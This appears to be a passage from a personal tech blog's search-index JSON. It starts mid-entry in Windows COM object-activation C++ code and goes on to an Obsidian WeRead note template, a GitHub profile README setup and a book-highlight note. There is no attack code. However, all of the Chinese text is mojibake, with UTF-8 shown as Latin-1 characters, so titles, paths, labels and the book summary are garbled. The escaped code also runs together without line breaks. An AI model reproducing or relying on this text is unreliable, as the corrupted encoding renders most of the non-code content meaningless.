fRetry=FALSE, fDownloadDone = FALSE, bClassEnabled = TRUE; DWORD relCount = 0; do &#123; if ( fRetry ) &#123; DWORD relCount = pActIn-&gt;Release(); Win4Assert(relCount==0); pActIn = new ActivationPropertiesIn; if ( pActIn == NULL ) return E_OUTOFMEMORY; AddOrigClsCtx(pActIn, dwClsCtx); fRetry = FALSE; // start with the assumption of termination &#125; Win4Assert(pActIn != NULL); hr = GetActivationPropertiesIn( pActIn, ConfClsid, dwClsCtx, pServerInfo, dwCount, SplitQI._pIIDArray, dwActvFlags, pdip, pCI); if(SUCCEEDED(hr)) &#123; HRESULT TempHR; //This is here because it is OK to fail and we use hr later IComClassInfo2 *pCI2 = NULL; if(!pCI) &#123; pCI = pActIn-&gt;GetComClassInfo(); Win4Assert(pCI != NULL); pCI-&gt;AddRef(); &#125; TempHR = pCI-&gt;QueryInterface(IID_IComClassInfo2, (void **)&amp;pCI2); if(SUCCEEDED(TempHR)) &#123; pCI2-&gt;IsEnabled(&amp;bClassEnabled); pCI2-&gt;Release(); &#125; &#125; if ( pCI ) &#123; pCI-&gt;Release(); pCI = NULL; &#125; if ( FAILED(hr) ) &#123; pActIn-&gt;Release(); goto exit_point; &#125; if(bClassEnabled == FALSE) &#123; pActIn-&gt;Release(); hr = CO_E_CLASS_DISABLED; goto exit_point; &#125;RETRY_ACTIVATION: IActivationStageInfo *pStageInfo = (IActivationStageInfo*) pActIn; // Start off activation at the beginning of client context stage hr = pStageInfo-&gt;SetStageAndIndex(CLIENT_CONTEXT_STAGE,0); if (FAILED (hr)) &#123; pActIn-&gt;Release(); goto exit_point; &#125; // This is the whole activation process hr = hrSave = pActIn-&gt;DelegateCreateInstance( punkOuter, &amp;pOutActivationProperties); // If the delegated activation returns ERROR_RETRY, // we walk the chain again, but AT MOST ONCE. // This is to support the private activations. if (HRESULT_FROM_WIN32(ERROR_RETRY) == hr) &#123; Win4Assert(!nRetries); if (!nRetries) &#123; BOOL fEnabled = TRUE; GetClassInfoFlags(pActIn, &amp;fEnabled, NULL, NULL); if (!fEnabled) &#123; hr = CO_E_CLASS_DISABLED; pActIn-&gt;Release(); goto exit_point; &#125; nRetries++; goto RETRY_ACTIVATION; &#125; &#125; #ifdef DIRECTORY_SERVICE if ( FAILED(hr) &amp;&amp; !(dwClsCtx &amp; CLSCTX_NO_CODE_DOWNLOAD) ) &#123; //download class if not registered locally -- but only once! if ( (REGDB_E_CLASSNOTREG == hr) &amp;&amp; !fDownloadDone ) &#123; //if successful, this will add a darwin id to the registry hr = DownloadClass(Clsid,dwClsCtx); fDownloadDone = fRetry = SUCCEEDED(hr); &#125; if ( hr == CS_E_PACKAGE_NOTFOUND ) &#123; hr = REGDB_E_CLASSNOTREG; &#125; &#125;#endif //DIRECTORY_SERVICE &#125; while ( fRetry ); if ( SUCCEEDED(hr) ) &#123; Win4Assert(pOutActivationProperties != NULL); if (pOutActivationProperties == NULL) &#123; hr = E_UNEXPECTED; &#125; else &#123; hr = pOutActivationProperties-&gt;GetObjectInterfaces(dwCount, dwActvFlags, pResults); &#125; &#125; if ( pOutActivationProperties ) &#123; relCount = pOutActivationProperties-&gt;Release(); Win4Assert(relCount==0); &#125; // Since doing an alloca, must release in after out // since actout may be contained by actin for // performance optimization relCount = pActIn-&gt;Release(); Win4Assert(relCount==0); if ( pDCE ) &#123; LOCK(CClassCache::_mxs); pDCE-&gt;Unlock(); UNLOCK(CClassCache::_mxs); &#125; &#125; &#125; &#125; exit_point: if ( pcf != NULL ) &#123; pcf-&gt;Release(); &#125; // // hrSave is the result of the entire activation chain, hr is the // result of any work done after the activation (unmarshalling the // interfaces, etc). If hr succeeded, then we want to update the // MULTI_QI array with the result of the actual activation, not the // rest. If hr failed, then we want to use it regardless of the value // of hrSave. // if (SUCCEEDED(hr)) hr = hrSave; hr = UpdateResultsArray( hr, dwCount, pResults ); return hr;&#125; combase!ScmRequestInfo::SetScmInfo å®šä¹‰ï¼š 123456789// Methods from IScmRequestInfoSTDMETHOD(SetScmInfo)(IN PRIV_SCM_INFO *pScmInfo)&#123; freeScmInfo((PRIV_SCM_INFO *)_scmRequestInfoData.pScmInfo); _scmRequestInfoData.pScmInfo = (CustomPrivScmInfo*)pScmInfo; freeRemoteRequest((REMOTE_REQUEST_SCM_INFO *)_scmRequestInfoData.remoteRequest); _scmRequestInfoData.remoteRequest = NULL; return S_OK;&#125;","tags":[],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"Homework-c-language","slug":"wiki/Homework-c-language","permalink":"https://hodlyounger.github.io/categories/wiki/Homework-c-language/"}]},{"title":"ã€é…ç½®ã€‘wereadä¸ªäººé…ç½®","date":"2024-08-31T01:35:29.379Z","path":"E_æ‰‹å†Œ/ä¸ªäººé…ç½®/ã€é…ç½®ã€‘wereadä¸ªäººé…ç½®/","text":"æ¦‚è¿°ï¼šweread æ’ä»¶ä¸ªäººé…ç½® weread ä¸ªäººé…ç½® 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980---name: &#123;&#123;metaData.title&#125;&#125;title: &#123;&#123;metaData.title&#125;&#125;cover: &#x27;&#123;&#123;metaData.cover&#125;&#125;&#x27;tags: - weread - å¾®ä¿¡è¯»ä¹¦author: &#123;&#123;metaData.author&#125;&#125;isbn: &#123;&#123;metaData.isbn&#125;&#125;rating: banner: &quot;![[true.jpg]]&quot;publish: &#123;&#123;metaData.publisher&#125;&#125;publishyear: &quot;&#123;&#123;metaData.publishTime|truncate(11,False,&#x27;&#x27;)&#125;&#125;&quot;category: &#123;&#123;metaData.category&#125;&#125;noteCount: &#123;&#123;metaData.noteCount&#125;&#125;reviewCount: &#123;&#123;metaData.reviewCount&#125;&#125;grade:status: &#123;&#123;metaData.finish&#125;&#125;readtime:pagecount: pageprogress: ---&gt; ä½œè€…ï¼š&#123;&#123;metaData.author&#125;&#125; &lt;!--more--&gt;&gt; [!abstract]- **å†…å®¹ç®€ä»‹**&gt; &gt; ã€Š&#123;&#123;metaData.title&#125;&#125;ã€‹&gt; &#123;&#123;metaData.intro|striptags(true)|trim&#125;&#125;## &#123;&#123;metaData.title&#125;&#125;&gt; [!bookinfo]+ **ã€Š&#123;&#123;metaData.title&#125;&#125;ã€‹**&gt; ![bookcover|200](&#123;&#123;metaData.cover&#125;&#125;)&gt; &gt; | å±æ€§ | å†…å®¹ |&gt; | - | ---- |&gt; | ISBN | &#123;&#123;metaData.isbn if metaData.isbn else &#x27;null&#x27;&#125;&#125; |&gt; | ä½œè€… | &#123;&#123;metaData.author&#125;&#125; |&gt; | å‡ºç‰ˆå¹´ | &#123;&#123;metaData.publishTime|truncate(11,False,&#x27;&#x27;)&#125;&#125; |&gt; | å‡ºç‰ˆç¤¾ | &#123;&#123;metaData.publisher&#125;&#125; |&gt; | æ¥æº | [&#123;&#123;metaData.title&#125;&#125;](https://weread.qq.com/web/) |&gt; | åˆ†ç±» | &#123;&#123;metaData.category&#125;&#125; |## é«˜äº®åˆ’çº¿&#123;% for chapter in chapterHighlights -%&#125;### &#123;&#123;chapter.chapterTitle&#125;&#125;&#123;% for highlight in chapter.highlights -%&#125;&#123;% if highlight.reviewContent -%&#125;&gt; [!quote] &#123;&#123;chapter.chapterTitle&#125;&#125;&gt; &#123;&#123; highlight.markText |trim &#125;&#125; &gt; &gt; &lt;p align=&quot;right&quot;&gt;&lt;sub&gt;â€” åˆ›å»ºäº [[&#123;&#123;highlight.createTime.slice(0, 10)&#125;&#125;]]&#123;&#123;highlight.createTime.slice(10, 16)&#125;&#125; ^&#123;&#123;highlight.chapterUid&#125;&#125;-&#123;&#123;highlight.range&#125;&#125;&lt;/sub&gt;&lt;/p&gt;- &#123;&#123;highlight.reviewContent&#125;&#125;&#123;% else %&#125;&gt; [!quote] &#123;&#123;chapter.chapterTitle&#125;&#125;&gt; &#123;&#123; highlight.markText |trim &#125;&#125; &gt; &gt; &lt;p align=&quot;right&quot;&gt;&lt;sub&gt;â€” åˆ›å»ºäº [[&#123;&#123;highlight.createTime.slice(0, 10)&#125;&#125;]]&#123;&#123;highlight.createTime.slice(10, 16)&#125;&#125; ^&#123;&#123;highlight.chapterUid&#125;&#125;-&#123;&#123;highlight.range&#125;&#125;&lt;/sub&gt;&lt;/p&gt;&#123;% endif %&#125; &#123;%- endfor %&#125;&#123;%- endfor %&#125;&#123;% for chapter in bookReview.chapterReviews -%&#125;&#123;% if chapter.reviews or chapter.chapterReview -%&#125;&#123;%for review in chapter.reviews -%&#125;&gt; [!quote] &#123;&#123;chapter.chapterTitle&#125;&#125;&gt; &#123;&#123;review.abstract |trim &#125;&#125; &gt; - &#123;&#123;review.content&#125;&#125;&gt; &lt;p align=&quot;right&quot;&gt;&lt;sub&gt;â€” åˆ›å»ºäº [[&#123;&#123;highlight.createTime.slice(0, 10)&#125;&#125;]]&#123;&#123;highlight.createTime.slice(10, 16)&#125;&#125; ^&#123;&#123;highlight.chapterUid&#125;&#125;-&#123;&#123;highlight.range&#125;&#125;&lt;/sub&gt;&lt;/p&gt;&gt; &#123;%- endfor %&#125; &#123;% if chapter.chapterReview -%&#125;### è¯»ä¹¦ç¬”è®°&gt; [!quote] &#123;&#123;chapter.chapterTitle&#125;&#125;&gt; &#123;&#123;chapter.chapterReview.content&#125;&#125;&#123;%-endif %&#125;&#123;% if chapter.reviews %&#125;&#123;%for review in chapter.reviews -%&#125; &#123;%- endfor %&#125; &#123;%-endif %&#125; &#123;%- endif %&#125; &#123;%- endfor %&#125;&#123;% if bookReview.bookReview -%&#125;### æœ¬ä¹¦è¯„è®º&#123;&#123;bookReview.bookReview.mdContent&#125;&#125; ^&#123;&#123;bookReview.bookReview.reviewId&#125;&#125;&#123;%- endif %&#125;","tags":[{"name":"æ‰‹å†Œ","slug":"æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C/"},{"name":"ä¸ªæ€§åŒ–","slug":"ä¸ªæ€§åŒ–","permalink":"https://hodlyounger.github.io/tags/%E4%B8%AA%E6%80%A7%E5%8C%96/"},{"name":"obsidian","slug":"obsidian","permalink":"https://hodlyounger.github.io/tags/obsidian/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"ä¸ªäººé…ç½®","slug":"E-æ‰‹å†Œ/ä¸ªäººé…ç½®","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/"}]},{"title":"ã€Githubã€‘profile é…ç½®","date":"2024-08-31T01:35:29.377Z","path":"E_æ‰‹å†Œ/ä¸ªäººé…ç½®/ã€Githubã€‘profile/","text":"å¦‚ä½•åˆ›å»ºä¸€ä¸ªå¥½çœ‹çš„ profile æ¨èé¡¹ç›®ï¼š durgeshsamariya/awesome-github-profile-readme-templates: This repository contains best profile readmeâ€™s for your reference. Metrics 1![Metrics](github-metrics.svg) æˆ‘çš„é…ç½® 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122&lt;!--**holdyounger/holdyounger** is a âœ¨ _special_ âœ¨ repository because its `README.md` (this file) appears on your GitHub profile.Here are some ideas to get you started:- ğŸ”­ Iâ€™m currently working on ...- ğŸŒ± Iâ€™m currently learning ...- ğŸ‘¯ Iâ€™m looking to collaborate on ...- ğŸ¤” Iâ€™m looking for help with ...- ğŸ’¬ Ask me about ...- ğŸ“« How to reach me: ...- ğŸ˜„ Pronouns: ...- âš¡ Fun fact: ...--&gt;&lt;img align=&quot;left&quot; style=&quot;border-radius: 50% !important;&quot; alt src=&quot;https://avatars.githubusercontent.com/u/88082435?s=400&amp;v=4&quot; width=&quot;60&quot; width=&quot;60&quot;&gt; [holdyounger.github.io](holdyounger.github.io)&lt;h1 align=&quot;center&quot;&gt; &lt;a href=&quot;https://sunguoqi.com/&quot;&gt; &lt;img src=&quot;https://readme-typing-svg.herokuapp.com/?font=Ma+Shan+Zheng&amp;lines=äººç”Ÿæ˜¯ç‹‚é‡ï¼Œä¸æ˜¯è½¨é“;å­¦è€Œä¸æ€åˆ™ç½”ï¼Œæ€è€Œä¸å­¦åˆ™æ®†;å›ºæ‰§æ— ç½ªï¼Œæ¢¦æƒ³æ— ä»·;å¼€å¿ƒæœ€é‡è¦;è¡Œåƒé‡Œè·¯ï¼Œè¯»ä¸‡å·ä¹¦&amp;center=true&amp;size=27&quot;&gt; &lt;/a&gt; &lt;/h1&gt;### &lt;picture&gt; &lt;img src = &quot;https://github.com/7oSkaaa/7oSkaaa/blob/main/Images/Programming_Languages.gif?raw=true&quot; width = 50px&gt; &lt;/picture&gt; Programming languages&lt;p align=&quot;center&quot;&gt; &amp;emsp; &lt;a href=&quot;https://www.cprogramming.com/&quot; target=&quot;_blank&quot;&gt; &lt;img alt=&quot;C&quot; src=&quot;https://img.shields.io/badge/C%20-%232370ED.svg?style=plastic&amp;logo=c&amp;logoColor=white&quot;&gt; &lt;/a&gt; &amp;emsp; &lt;img alt=&quot;C++&quot; src=&quot;https://img.shields.io/badge/C++%20-%2300599C.svg?style=plastic&amp;logo=c%2B%2B&amp;logoColor=white&quot;&gt; &amp;emsp; &lt;img alt=&quot;Windows&quot; src=&quot;https://img.shields.io/badge/OS-Windows-%23426ab3.svg?style=plastic&amp;logoColor=black&quot;&gt; &amp;emsp; &lt;img alt=&quot;Linux&quot; src=&quot;https://img.shields.io/badge/OS-Linux-%23f58220.svg?style=plastic&amp;logoColor=black&quot;&gt; &amp;emsp; &lt;img alt=&quot;Go&quot; src=&quot;https://img.shields.io/badge/Go-%232a5caa.svg?style=plastic&amp;logo=Go&amp;logoColor=white&quot;&gt; &amp;emsp; &lt;img alt=&quot;osquery&quot; src=&quot;https://img.shields.io/badge/osquery-%232a5caa.svg?style=plastic&amp;logoColor=white&quot;&gt; &amp;emsp; &lt;img alt=&quot;libevent&quot; src=&quot;https://img.shields.io/badge/libevent-%235f3c23.svg?style=plastic&amp;logoColor=white&quot;&gt; &amp;emsp; &lt;img alt=&quot;Qt&quot; src=&quot;https://img.shields.io/badge/Qt5-%237fb80e?style=plastic&amp;logo=Qt&amp;logoColor=white&quot;&gt; &amp;emsp; &lt;img alt=&quot;.Net&quot; src=&quot;https://img.shields.io/badge/.Net-%23512BD4?style=plastic&amp;logo=.Net&amp;logoColor=white&quot;&gt;&lt;/p&gt; ### &lt;picture&gt; &lt;img src = &quot;https://github.com/7oSkaaa/7oSkaaa/blob/main/Images/Software_Tools.gif?raw=true&quot; width = 50px&gt; &lt;/picture&gt; Software &amp; Tools &lt;p align=&quot;center&quot;&gt; &amp;emsp; &lt;a href=&quot;#&quot;&gt;&lt;img alt=&quot;Git&quot; src=&quot;https://img.shields.io/badge/Git%20-%23F05033.svg?style=plastic&amp;logo=git&amp;logoColor=white&quot;&gt;&lt;/a&gt; &amp;emsp; &lt;a href=&quot;#&quot;&gt;&lt;img alt=&quot;GitHub&quot; src=&quot;https://img.shields.io/badge/github-%23181717.svg?style=plastic&amp;logo=github&amp;logoColor=white&quot;&gt;&lt;/a&gt; &amp;emsp; &lt;a href=&quot;#&quot;&gt;&lt;img alt=&quot;Google Sheets&quot; src=&quot;https://img.shields.io/badge/Google%20Sheets%20-%2334A853.svg?style=plastic&amp;logo=google%20sheets&amp;logoColor=white&quot;&gt;&lt;/a&gt; &amp;emsp; &lt;a href=&quot;#&quot;&gt;&lt;img alt=&quot;Mark Down&quot; src=&quot;https://img.shields.io/badge/Markdown-000000?style=plastic&amp;logo=markdown&amp;logoColor=white&quot;&gt;&lt;/a&gt; &amp;emsp; &lt;a href=&quot;#&quot;&gt;&lt;img alt=&quot;Stack Overflow&quot; src=&quot;https://img.shields.io/badge/-Stack%20Overflow-FE7A16?style=plastic&amp;logo=stack-overflow&amp;logoColor=white&quot;&gt;&lt;/a&gt; &amp;emsp; &lt;a href=&quot;#&quot;&gt;&lt;img alt=&quot;Geekf For Geeks&quot; src=&quot;https://img.shields.io/badge/geeksforgeeks-%230F9D58.svg?style=plastic&amp;logo=geeksforgeeks&amp;logoColor=white&quot;&gt;&lt;/a&gt; &amp;emsp; &lt;a href=&quot;#&quot;&gt;&lt;img alt=&quot;JSON&quot; img src=&quot;https://img.shields.io/badge/json-%23000000.svg?style=plastic&amp;logo=json&amp;logoColor=white&quot;&gt;&lt;/a&gt; &amp;emsp; &lt;a href=&quot;#&quot;&gt;&lt;img alt=&quot;OpenGL&quot; src=&quot;https://img.shields.io/badge/opengl-%235586A4.svg?style=plastic&amp;logo=opengl&amp;logoColor=white&quot;&gt;&lt;/a&gt; &amp;emsp; &lt;a href=&quot;#&quot;&gt;&lt;img alt=&quot;Selenium&quot; src=&quot;https://img.shields.io/badge/selenium-%2343B02A.svg?&amp;style=plastic&amp;logo=selenium&amp;logoColor=white&quot;&gt;&lt;/a&gt; &amp;emsp; &lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/latex-%23008080.svg?&amp;style=plastic&amp;logo=latex&amp;logoColor=white&quot; /&gt;&lt;/a&gt; &amp;emsp; &lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/django-%23092E20.svg?&amp;style=plastic&amp;logo=django&amp;logoColor=white&quot; /&gt;&lt;/a&gt; &amp;emsp; &lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/mysql-%234479A1.svg?&amp;style=plastic&amp;logo=mysql&amp;logoColor=white&quot;/&gt;&lt;/a&gt;&lt;/p&gt; ### &lt;picture&gt; &lt;img src = &quot;https://github.com/7oSkaaa/7oSkaaa/blob/main/Images/IDEs.gif?raw=true&quot; width = 50px&gt; &lt;/picture&gt; IDEs &lt;p align=&quot;center&quot;&gt; &amp;emsp; &lt;a href=&quot;#&quot;&gt;&lt;img alt=&quot;Visual Studio Code&quot; src=&quot;https://img.shields.io/badge/Visual%20Studio%20Code-0078d7.svg?style=plastic&amp;logo=visual-studio-code&amp;logoColor=white&quot;&gt;&lt;/a&gt; &amp;emsp; &lt;a href=&quot;#&quot;&gt;&lt;img alt=&quot;Visual Studio&quot; src=&quot;https://img.shields.io/badge/Visual%20Studio-%23512BD4?style=plastic&amp;logo=visual-studio&amp;logoColor=white&quot; /&gt;&lt;/a&gt;&lt;/p&gt; ### &lt;picture&gt; &lt;img src = &quot;https://github.com/7oSkaaa/7oSkaaa/blob/main/Images/OS.gif?raw=true&quot; width = 50px&gt; &lt;/picture&gt; Operating Systems &lt;p align=&quot;center&quot;&gt; &amp;emsp; &lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/Linux-FCC624?style=plastic&amp;logo=linux&amp;logoColor=black&quot;&gt;&lt;/a&gt; &amp;emsp; &lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/Ubuntu-E95420?style=plastic&amp;logo=ubuntu&amp;logoColor=white&quot;&gt;&lt;/a&gt; &amp;emsp; &lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/Windows-0078D6?style=plastic&amp;logo=windows&amp;logoColor=white&quot;&gt;&lt;/a&gt;&lt;/p&gt;&lt;p align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/holdyounger&quot;&gt; &lt;img height=&quot;180em&quot; src=&quot;https://github-readme-stats-eight-theta.vercel.app/api?username=holdyounger&amp;show_icons=true&amp;theme=algolia&amp;include_all_commits=true&amp;count_private=true&quot;/&gt; &lt;img height=&quot;180em&quot; src=&quot;https://github-readme-stats-eight-theta.vercel.app/api/top-langs/?username=holdyounger&amp;layout=compact&amp;langs_count=8&amp;theme=algolia&quot;/&gt;&lt;/a&gt;&lt;/p&gt;&lt;table align=&quot;center&quot; style=&quot;border:0;&quot;&gt; &lt;tr style=&quot;border:0;&quot;&gt; &lt;td&gt;You are visitor&lt;/td&gt; &lt;td&gt;&lt;img src=&quot;https://profile-counter.glitch.me/holdyounger/count.svg&quot; alt=&quot;&quot; /&gt;&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;# å¿«é€Ÿå…¥å£ï¼š[ğŸ§µ Learn From](https://github.com/holdyounger/ScopeBlog)## Qté¡¹ç›®- [holdyounger/Qt\\_TopShowMsg: Qt çª—å£é¡¶éƒ¨å¼¹å‡ºæ¶ˆæ¯æç¤ºï¼ˆä»¿ç§»åŠ¨ç«¯é¡¶éƒ¨æ¶ˆæ¯æç¤ºï¼‰](https://github.com/holdyounger/Qt_TopShowMsg)- [holdyounger/Qt-ImageRecognition: Apiå›¾ç‰‡è¯†åˆ«](https://github.com/holdyounger/Qt-ImageRecognition)- [holdyounger/Qt\\_Gobang: Qt äº”å­æ£‹å°ç¨‹åº](https://github.com/holdyounger/Qt_Gobang)- [holdyounger/Qt-DesktopClock: Qt æ¡Œé¢æ—¶é’Ÿï¼Œå«apiè°ƒç”¨çš„æ¯æ—¥ä¸€è¨€åŠŸèƒ½](https://github.com/holdyounger/Qt-DesktopClock)--- github commit userinfo 12345holdyounger88082435+holdyounger@users.noreply.github.comfole-del 53629628+fole-del@users.noreply.github.com","tags":[{"name":"ä¸ªæ€§åŒ–","slug":"ä¸ªæ€§åŒ–","permalink":"https://hodlyounger.github.io/tags/%E4%B8%AA%E6%80%A7%E5%8C%96/"},{"name":"github","slug":"github","permalink":"https://hodlyounger.github.io/tags/github/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"ä¸ªäººé…ç½®","slug":"E-æ‰‹å†Œ/ä¸ªäººé…ç½®","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/"}]},{"title":"æŠ€æœ¯äººä¿®ç‚¼ä¹‹é“ï¼šä»ç¨‹åºå‘˜åˆ°ç™¾ä¸‡é«˜ç®¡çš„72é¡¹æŠ€èƒ½","date":"2024-08-31T01:35:29.375Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/è®¡ç®—æœº/æŠ€æœ¯äººä¿®ç‚¼ä¹‹é“ï¼šä»ç¨‹åºå‘˜åˆ°ç™¾ä¸‡é«˜ç®¡çš„72é¡¹æŠ€èƒ½-é»„å“²é“¿/","text":"ä½œè€…ï¼šé»„å“²é“¿ - å†…å®¹ç®€ä»‹ ã€ŠæŠ€æœ¯äººä¿®ç‚¼ä¹‹é“ï¼šä»ç¨‹åºå‘˜åˆ°ç™¾ä¸‡é«˜ç®¡çš„72é¡¹æŠ€èƒ½ã€‹ æœ¬ä¹¦æ—¨åœ¨å¸®åŠ©ITæŠ€æœ¯äººå‘˜æå‡èŒåœºæ ¸å¿ƒæŠ€èƒ½ã€æ¶æ„æ€ç»´ã€å›¢é˜Ÿç®¡ç†èƒ½åŠ›ã€å•†ä¸šè®¤çŸ¥ï¼Œè®©æ¯ä¸€ä½æ™®é€šçš„æŠ€æœ¯ä»ä¸šè€…ï¼Œä¿®ç‚¼æˆä¸ºâ€œæŠ€æœ¯èŒåœºè¶…çº§ä¸ªä½“â€ï¼Œé€šè¿‡å…¨é¢å‡çº§ä¸ªäººçš„åº•å±‚æ“ä½œç³»ç»Ÿï¼Œçªç ´ç“¶é¢ˆï¼Œå®ç°èŒåœºè·ƒè¿ã€‚æœ¬ä¹¦æŒ‰ç…§æŠ€æœ¯èŒåœºäººçš„æˆé•¿è½¨è¿¹ï¼Œé¦–å…ˆå…³æ³¨æŠ€æœ¯äººçš„èŒåœºå®šä½ã€æ€ç»´æ–¹å¼å‡çº§ã€èŒåœºæ²Ÿé€šã€æ¶æ„æ€ç»´ã€å­¦ä¹ èƒ½åŠ›å’Œåˆ›æ–°èƒ½åŠ›ã€‚ç„¶åä»‹ç»ä»æŠ€æœ¯è½¬ç®¡ç†ä¼šè¸©çš„å‘ã€æœ‰æ•ˆç®¡ç†çš„åŸåˆ™ã€æ‰“é€ é«˜æ•ˆç»„ç»‡æ¶æ„ã€å›¢é˜Ÿé«˜æ•ˆæ‰§è¡ŒåŠ›ã€æŠ€æœ¯äººæ‰çš„é€‰ç”¨è‚²ç•™ã€ç®¡ç†è€…çš„è‡ªæˆ‘ä¿®å…»ã€ç®¡ç†è€…çš„å•†ä¸šæ€ç»´ã€‚å…¨ä¹¦æ€»ç»“äº†ä»ç¨‹åºå‘˜åˆ°æŠ€æœ¯é«˜ç®¡ï¼Œæ‰€éœ€çš„72é¡¹æŠ€èƒ½ã€‚è¿™äº›æŠ€èƒ½æ¥è‡ª50å¤šä½ä¸€çº¿äº’è”ç½‘å…¬å¸ä»ä¸šè€…çš„ç»éªŒæ€»ç»“ï¼Œä»¥åŠä½œè€…å°†è¿‘20å¹´çš„èŒåœºç»éªŒã€‚å¦‚æœä½ æ˜¯æŠ€æœ¯èŒåœºå°ç™½ï¼Œæœ¬ä¹¦çš„â€œæŠ€æœ¯äººçš„è‡ªæˆ‘ä¿®å…»â€â€œæ€ç»´æ–¹å¼çš„å‡çº§â€â€œå­¦ä¹ åŠ›ä¸åˆ›æ–°åŠ›â€ç­‰ç« èŠ‚ï¼Œå¯ä»¥å¸®åŠ©ä½ æ ‘ç«‹æ­£ç¡®çš„ä»·å€¼è§‚ã€åŸ¹å…»è‰¯å¥½çš„èŒä¸šä¹ æƒ¯ã€æå‡æ€ç»´èƒ½åŠ›ã€æé«˜å­¦ä¹ åŠ›å’Œåˆ›æ–°åŠ›ï¼Œä¸ºè¿›å…¥æ›´å¤§çš„å¹³å°æ‰“ä¸‹ç‰¢å›ºåšå®çš„åŸºç¡€ã€‚å¦‚æœä½ æ˜¯å¯»æ±‚çªç ´çš„èµ„æ·±å·¥ç¨‹å¸ˆï¼Œæœ¬ä¹¦çš„â€œæŠ€æœ¯äººçš„éš¾â€˜è¨€â€™ä¹‹ç—›â€â€œæŠ€æœ¯äººéƒ½è¦å­¦çš„æ¶æ„æ€ç»´â€â€œç®¡ç†ä¸­å¸¸è§çš„â€˜å‘â€™â€ç­‰ç« èŠ‚ï¼Œå¯ä»¥å¸®åŠ©ä½ æå‡æ²Ÿé€šæŠ€å·§å’Œæ¶æ„æ€ç»´ï¼Œè·¨è¶Šä»æŠ€æœ¯åˆ°ç®¡ç†çš„é¸¿æ²Ÿï¼Œå‘æ˜æ›´å¤šè‡ªèº«çš„å¯èƒ½æ€§ï¼Œçªç ´â€œ35å²èŒåœºç°è±¡â€ï¼Œæ‰“å¼€æŠ€æœ¯èŒåœºçš„å¦ä¸€ç‰‡å¹¿é˜”å¤©åœ°ã€‚å¦‚æœä½ æ˜¯æŠ€æœ¯ç®¡ç†è€…ï¼Œæœ¬ä¹¦çš„â€œæœ‰æ•ˆç®¡ç†çš„åŸåˆ™â€â€œæ‰“é€ é«˜æ•ˆçš„ç»„ç»‡æ¶æ„â€â€œå›¢é˜Ÿé«˜æ•ˆæ‰§è¡ŒåŠ›â€â€œç®¡ç†ä¸‹å±ï¼šäººæ‰çš„é€‰ç”¨è‚²ç•™â€â€œç®¡ç†è€…çš„è‡ªæˆ‘ä¿®å…»â€â€œæŠ€æœ¯äººçš„å•†ä¸šæ€ç»´â€ç­‰ç« èŠ‚ï¼Œå¯ä»¥å¸®åŠ©ä½ æå‡å•†ä¸šæ€ç»´ï¼ŒæŒæ¡ä¸šç•Œé¢†å…ˆçš„å›¢é˜Ÿç®¡ç†å·¥å…·ï¼Œå®ç°â€œæŠ€æœ¯é©±åŠ¨å•†ä¸šè…¾é£â€çš„æ¢¦æƒ³ã€‚ æŠ€æœ¯äººä¿®ç‚¼ä¹‹é“ï¼šä»ç¨‹åºå‘˜åˆ°ç™¾ä¸‡é«˜ç®¡çš„72é¡¹æŠ€èƒ½ + ã€ŠæŠ€æœ¯äººä¿®ç‚¼ä¹‹é“ï¼šä»ç¨‹åºå‘˜åˆ°ç™¾ä¸‡é«˜ç®¡çš„72é¡¹æŠ€èƒ½ã€‹ å±æ€§ å†…å®¹ ISBN 9787121400254 ä½œè€… é»„å“²é“¿ å‡ºç‰ˆå¹´ 2020-12-01 å‡ºç‰ˆç¤¾ ç”µå­å·¥ä¸šå‡ºç‰ˆç¤¾ æ¥æº æŠ€æœ¯äººä¿®ç‚¼ä¹‹é“ï¼šä»ç¨‹åºå‘˜åˆ°ç™¾ä¸‡é«˜ç®¡çš„72é¡¹æŠ€èƒ½ åˆ†ç±» è®¡ç®—æœº-æ•°æ®åº“ é«˜äº®åˆ’çº¿ ç¬¬1ç«  æŠ€æœ¯äººçš„è‡ªæˆ‘ä¿®å…» ç¬¬1ç«  æŠ€æœ¯äººçš„è‡ªæˆ‘ä¿®å…» ç¬¬ä¸€é¡¹ï¼Œæ€ç»´å’Œåˆ›é€ åŠ›ã€‚æŠ€æœ¯äººå¤§éƒ½æ˜¯ç†å·¥ç§‘å‡ºèº«çš„ï¼Œç»è¿‡å¤šå¹´çš„è®­ç»ƒï¼Œå·²ç»å½¢æˆäº†å·¥ç¨‹å¸ˆæ€ç»´ï¼Œå·¥ç¨‹å¸ˆæ€ç»´æ›´å¤šè€ƒè™‘çš„æ˜¯What çš„é—®é¢˜ã€‚ â€” åˆ›å»ºäº [[2023-02-24]] 11:41 ^8-3024-3094 ç¬¬1ç«  æŠ€æœ¯äººçš„è‡ªæˆ‘ä¿®å…» 